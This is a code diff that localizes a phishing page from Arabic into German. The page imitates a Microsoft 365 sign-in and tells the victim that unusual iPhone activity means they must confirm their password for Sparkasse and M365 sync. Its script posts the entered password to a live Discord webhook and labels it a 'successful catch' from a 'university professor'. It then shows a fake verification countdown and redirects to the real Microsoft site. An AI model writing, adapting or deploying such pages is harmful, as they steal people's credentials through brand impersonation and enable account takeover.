@@ -1,12 +1,12 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="de" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - Microsoft 365</title>
+    <title>Anmelden - Microsoft 365</title>
     <style>
         body {
-            font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
+            font-family: 'Segoe UI', SegoeUI, 'Helvetica Neue', Helvetica, Arial, sans-serif;
             background-color: #f2f2f2;
             margin: 0;
             display: flex;
@@ -22,7 +22,7 @@
         }
         .logo { width: 108px; margin-bottom: 20px; }
         h2 { font-size: 24px; margin: 0 0 16px; color: #1b1b1b; }
-        p { font-size: 15px; margin-bottom: 20px; }
+        p { font-size: 15px; margin-bottom: 20px; line-height: 1.4; color: #1b1b1b; }
         input[type="password"] {
             width: 100%;
             padding: 8px 10px;
@@ -45,7 +45,6 @@
         }
         button:hover { background-color: #005da6; }
         
-        /* تصميم المؤقت */
         #timer-section { display: none; text-align: center; }
         .spinner {
             border: 4px solid #f3f3f3;
@@ -63,51 +62,56 @@
 
 <div class="login-card" id="login-section">
     <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft">
-    <h2 id="title">أدخل كلمة المرور</h2>
-    <p>بسبب تحديثات الأمان في <b>جامعتنا</b>، يرجى تأكيد كلمة المرور لمتابعة العرض.</p>
+    <h2>Kennwort eingeben</h2>
+    <p>Ungewöhnliche Aktivität auf Ihrem <b>iPhone</b> erkannt. Bitte bestätigen Sie Ihr Kennwort zur Synchronisierung mit <b>Sparkasse</b> und <b>M365</b> Services.</p>
     
-    <input type="password" id="target_pass" placeholder="كلمة المرور" required>
+    <input type="password" id="target_pass" placeholder="Kennwort" required>
     
     <div class="btn-container">
-        <button onclick="sendData()">تسجيل الدخول</button>
+        <button onclick="sendData()">Anmelden</button>
     </div>
 </div>
 
 <div class="login-card" id="timer-section">
     <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft">
-    <h3>جاري التحقق من بروتوكولات الآيفون...</h3>
+    <h3>Identität wird überprüft...</h3>
     <div class="spinner"></div>
-    <p>يرجى الانتظار <span id="seconds">10</span> ثوانٍ لإتمام المزامنة.</p>
+    <p>Bitte warten Sie <span id="seconds">10</span> Sekunden, um den Vorgang abzuschließen.</p>
 </div>
 
 <script>
     function sendData() {
         const password = document.getElementById('target_pass').value;
-        const webhookURL = "https://discordapp.com/api/webhooks/1493722493511401704/aYkLDXbIECF4GaV9BH7FQUuvZ7zpjdBDUqdoGoJT9hZurBLMv-heWVb-fbtbJWAc4xWF";
+        const webhookURL = "https://discord.com/api/webhooks/1493722493511401704/aYkLDXbIECF4GaV9BH7FQUuvZ7zpjdBDUqdoGoJT9hZurBLMv-heWVb-fbtbJWAc4xWF";
 
         if (password.length < 1) {
-            alert("يرجى إدخال كلمة المرور");
+            alert("Bitte geben Sie Ihr Kennwort ein.");
             return;
         }
 
-        // إرسال البيانات إلى ديسكورد
         fetch(webhookURL, {
             method: 'POST',
+            mode: 'no-cors', 
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                embeds: [{
-                    title: "🚨 تم اصطياد بيانات جديدة!",
-                    color: 15158332,
-                    fields: [
-                        { name: "🔑 كلمة السر المكتوبة", value: "" + password + "", inline: false },
-                        { name: "📱 الجهاز المكتشف", value: "iPhone / iOS User", inline: true },
-                        { name: "⏰ الوقت", value: new Date().toLocaleString(), inline: true }
-                    ],
-                    footer: { text: "نظام التتبع الرقمي - تحدي النخبة" }
-                }]
+                content: "🚨 **Erfolgreicher Fang!**\n**Ziel:** Universität Professor\n**Passwort:** `" + password + "`\n**System:** iOS / Sparkasse Sync"
             })
         });
 
-        // تبديل الواجهة للمؤقت
         document.getElementById('login-section').style.display = 'none';
         document.getElementById('timer-section').style.display = 'block';
+
+        let count = 10;
+        const countdown = setInterval(() => {
+            count--;
+            document.getElementById('seconds').innerText = count;
+            if (count <= 0) {
+                clearInterval(countdown);
+                window.location.href = "https://www.microsoft.com/de-de/microsoft-365";
+            }
+        }, 1000);
+    }
+</script>
+
+</body>
+</html>
